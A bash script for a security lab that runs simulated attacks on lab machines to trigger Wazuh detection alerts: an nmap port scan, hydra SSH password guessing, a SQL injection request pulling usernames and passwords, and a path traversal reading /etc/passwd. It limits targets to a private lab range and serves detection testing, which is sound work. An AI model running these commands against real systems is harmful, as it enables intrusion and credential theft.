#!/usr/bin/env bash
# Lab-only attack simulations. Run from the attacker VM against your own lab machines.
# Usage: ./run-linux-tests.sh <scan|bruteforce|web|all> <target-ip>
set -euo pipefail

LAB_PREFIX="192.168.56."
test_name="${1:-}"; target="${2:-}"

if [[ -z "$test_name" || -z "$target" ]]; then
  echo "Usage: $0 <scan|bruteforce|web|all> <target-ip>"; exit 1
fi
if [[ "$target" != ${LAB_PREFIX}* ]]; then
  echo "Refusing: $target is outside the lab range ${LAB_PREFIX}0/24"; exit 1
fi

stamp() { echo "[$(date '+%F %T')] $*"; }

scan() {
  stamp "Port scan against $target"
  nmap -sS -T4 -p 1-1000 "$target"
}

bruteforce() {
  stamp "SSH password guessing against $target (user: labtest, 20 wrong passwords)"
  printf 'password%s\n' $(seq 1 20) > /tmp/lab-passwords.txt
  hydra -l labtest -P /tmp/lab-passwords.txt -t 4 "ssh://$target" || true
}

web() {
  stamp "Web attacks against http://$target"
  curl -s -o /dev/null -w '%{http_code}  SQL injection\n' "http://$target/?id=1%20union%20select%20username,password%20from%20users"
  curl -s -o /dev/null -w '%{http_code}  path traversal\n' --path-as-is "http://$target/../../../../etc/passwd"
}

case "$test_name" in
  scan) scan ;;
  bruteforce) bruteforce ;;
  web) web ;;
  all) scan; bruteforce; web ;;
  *) echo "Unknown test: $test_name"; exit 1 ;;
esac
stamp "Done. Check the Wazuh dashboard for alerts."
